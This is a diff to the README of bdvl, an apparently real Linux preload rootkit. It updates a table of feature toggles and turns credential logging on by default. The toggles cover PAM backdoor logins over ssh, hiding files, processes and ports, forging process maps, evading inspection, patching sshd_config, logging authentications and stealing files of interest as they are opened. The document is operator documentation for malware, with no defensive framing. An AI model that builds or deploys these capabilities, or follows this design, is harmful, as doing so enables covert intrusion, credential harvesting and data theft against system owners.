@@ -60,6 +60,8 @@
   * This is so that we don't have to force the option of password authentication in the box's sshd_config in order to access the backdoor.
   * Due to the fact that functions are being hooked to grant backdoor access, this does not work as of yet.
   * It isn't just a matter of storing a public key & having it authenticate you when logging in.
+  * There is a functionality within bdvl that will more or less eliminate this being a problem.
+    * See __PATCH_SSHD_CONFIG__.
 
 <hr>
 
@@ -103,23 +105,25 @@
    * Ample details within comments. 
  * See the table below.
 
-| Toggle                 | Info                                                           | Default status | Dependency | Ignored(?) |
-| :--------------------- | :------------------------------------------------------------- | :------------- | :--------- | :--------- |
-| __USE_PAM_BD__         | allows interactive login as a backdoor user via ssh            | on             | libpam     | no         |
-| __LOG_LOCAL_AUTH__     | log successful user authentications on the box                 | off            | libpam     | no         |
-| __HIDE_SELF__          | hides files and processes based on rootkit magic GID           | on             | -          | yes        |
-| __FORGE_MAPS__         | hides rootkit presence from process map files                  | on             | -          | yes        |
-| __HIDE_PORTS__         | hides ports & port ranges defined in 'hide_ports' file         | on             | -          | yes        |
-| __DO_REINSTALL__       | maintains the rootkit's preload file                           | on             | -          | yes        |
-| __DO_EVASIONS__        | hides rootkit presence from unsavoury processes                | on             | -          | yes        |
-| __READ_GID_FROM_FILE__ | magic GID value is changeable from backdoor shell via command. | on             | -          | no         |
-| __AUTO_GID_CHANGER__   | the magic GID will refresh every so often. see comments.       | on             | -          | no         |
-| __PATCH_SSHD_CONFIG__  | this will keep `UsePAM` & `PasswordAuthentication` enabled     | on             | -          | no         |
-| __BACKDOOR_UTIL__      | allows access to a host of backdoor utilities. see comments.   | on             | -          | yes        |
-| __LOG_SSH__            | logs login attempts from over ssh                              | off            | -          | yes        |
-| __FILE_STEAL__         | attempts to steal FoI when opened by open/fopen                | on             | -          | no         |
-| __LINK_IF_ERR__        | link said FoI if we can't copy it                              | off            | -          | yes        |
-| __USE_CRYPT__          | to use or not to use libcrypt                                  | on             | libcrypt   | yes        |
+| Toggle                   | Info                                                           | Default status | Dependency | Ignored(?) |
+| :----------------------- | :------------------------------------------------------------- | :------------- | :--------- | :--------- |
+| __USE_PAM_BD__           | allows interactive login as a backdoor user via ssh            | on             | libpam     | no         |
+| __LOG_LOCAL_AUTH__       | log successful user authentications on the box                 | on             | libpam     | no         |
+| __HIDE_SELF__            | hides files and processes based on rootkit magic GID           | on             | -          | yes        |
+| __FORGE_MAPS__           | hides rootkit presence from process map files                  | on             | -          | yes        |
+| __HIDE_PORTS__           | hides ports & port ranges defined in 'hide_ports' file         | on             | -          | yes        |
+| __DO_REINSTALL__         | maintains the rootkit's preload file                           | on             | -          | yes        |
+| __DO_EVASIONS__          | hides rootkit presence from unsavoury processes                | on             | -          | yes        |
+| __READ_GID_FROM_FILE__   | magic GID value is changeable from backdoor shell via command. | on             | -          | no         |
+| __AUTO_GID_CHANGER__     | the magic GID will refresh every so often. see comments.       | on             | -          | no         |
+| __PATCH_SSHD_CONFIG__    | this will keep `UsePAM` & `PasswordAuthentication` enabled     | on             | -          | no         |
+| __BACKDOOR_UTIL__        | allows access to a host of backdoor utilities. see comments.   | on             | -          | yes        |
+| __SET_MAGIC_ENV_UNHIDE__ | set magic env var in `./bdv unhideself` shell process.         | on             | -          | no         |
+| __BACKDOOR_PKGMAN__      | safe package management access from backdoor shell.            | on             | -          | no         |
+| __LOG_SSH__              | logs login attempts from over ssh                              | on             | -          | no         |
+| __FILE_STEAL__           | attempts to steal FoI when opened by open/fopen                | on             | -          | no         |
+| __LINK_IF_ERR__          | link said FoI if we can't copy it                              | off            | -          | yes        |
+| __USE_CRYPT__            | to use or not to use libcrypt                                  | on             | libcrypt   | yes        |
 
 <hr>
 
